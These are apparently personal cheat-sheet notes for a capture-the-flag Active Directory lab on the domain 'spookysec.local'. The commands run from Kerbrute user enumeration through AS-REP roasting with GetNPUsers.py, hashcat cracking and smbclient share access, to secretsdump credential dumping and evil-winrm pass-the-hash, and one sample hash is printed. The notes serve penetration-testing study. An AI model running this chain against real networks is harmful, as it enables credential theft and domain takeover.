----------------------------------------------------------------------------------------------------------------------------------------------------------------
TOOLS: IMPACKET  && BLOODHOUND && neo4j && Enumm4Linux && Kerbrute
----------------------------------------------------------------------------------------------------------------------------------------------------------------
INSTAL IMPACKET
                1- clone Impacket into /opt/impacket:
                                         "git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket"
                2- Install the Python requirements for Impacket:
                                          "pip3 install -r /opt/impacket/requirements.txt"
                3- Run the python setup install script:
                                           "cd /opt/impacket/ && python3 ./setup.py install"
      // IF ERRs try //
                Try the following script and see if this works:
                  1- sudo git clone https://github.com/SecureAuthCorp/impacket.git /opt/impacket
                  2- sudo pip3 install -r /opt/impacket/requirements.txt
                  3- cd /opt/impacket/ 
                  4- sudo pip3 install .
                  5- sudo python3 setup.py instal
INSTALL BLOODOUND && neo4j
                  1- apt install bloodhound neo4j
                  2- sudo apt update && sudo apt upgrade -y
INSTALL KERBRUTE
                  1- git clone https://github.com/Sq00ky/attacktive-directory-tools.git
                  2- #executable kerbrute
                          chmod u=rwx kerbrute 
                          chmod +x kerbrute 
                      #useful command
                          ./kerbrute -h  #can see the usage for kerbrute

                
----------------------------------------------------------------------------------------------------------------------------------------------------------------
ENUMERATION      NMAP &&  ENUM$LINUX   && NMAP 
----------------------------------------------------------------------------------------------------------------------------------------------------------------
ENUM4LINUX
                  1- enum4linux [OPTIONS] IP
                  2- Kerbrute: brute force discovery of users, passwords and even password spray!
                  !! NOT recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.
                  3- #how to properly use userenum
                                          "./kerbrute userenum -h"
                     #take a look to the flags
                                  --dc
                                  -d
                                  -t
                                          "./kerbrute userenum --dc <DC's_IP> -d spookysec.local userlist.txt -t 100"
NMAP    
                  1- "nmap -sV -sC -T4 <DC's_IP>"

----------------------------------------------------------------------------------------------------------------------------------------------------------------
EXPLOIT    GetNPUsers.py   &&   HASHCAT
----------------------------------------------------------------------------------------------------------------------------------------------------------------

Attack method called ASREPRoasting: 
                        Occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the 
                        account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

Retrieving Kerberos Tickets
                        Impacket has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts
                        from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated 
                        previously via Kerbrute.
GetNPuser.py
                        1- "GetNPUsers.py  -h"
                        2- execute a command & and copy to file
                            "GetNPUsers.py -no-pass -dc-ip <DC's_IP> spookysec.local/svc-admin | tee ~/Downloads/hash.txt"
HASHCAT
            1-  "hashcat -m 18200 -a 0 hash.txt passwordlist.txt --force"
----------------------------------------------------------------------------------------------------------------------------------------------------------------
ENUMERATION    With   USER ACCOUNT CREENTIALS
----------------------------------------------------------------------------------------------------------------------------------------------------------------
TOOLS:   smbclient

smbclient: 
          1-  smbclient -L <DC's_IP> -U ‘svc-admin’                                        <- 'svc-admin = is the cracked account'
                # you will be prompted for passwd & then shares will be listed on spookysec.local
          2-  If you find an Ineteresting share connect to it (ie backup dir)
              smbclient //<DC's_IP>/<dir_wanting_to_see> -U 'svc-admin'
          2a-     more <filename.txt>                                                         <- use "more" to read file
          3-      get <filename.txt>                                                          <- download file to your computer
          4-  Decode Base 64 in cmd line
                  base64 --decode <file OR chars>
----------------------------------------------------------------------------------------------------------------------------------------------------------------
DOMAIN Privilege Escalation         SECRETSDUMP.PY            Pass-the-has with EVIL-WINRM
----------------------------------------------------------------------------------------------------------------------------------------------------------------
Sync Up!

Now that we have new user account credentials, we may have more privileges on the system than before. The username is "backup", the backup account for the Domain
Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. Including password hashes

We can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account 
(that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

1- secretsdump.py -just-dc <username:password@DC'S_IP_ADDRESS>                         <- i.e.    admin:password@10.1.9.2
        NOTE: this dumps NTDS.DIT
        Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
                                                           --------------------------------
                                                           The Hash
2- evil-winrm -i <DC's_IP> -u <USER_ACCOUNT> -H <HASH>















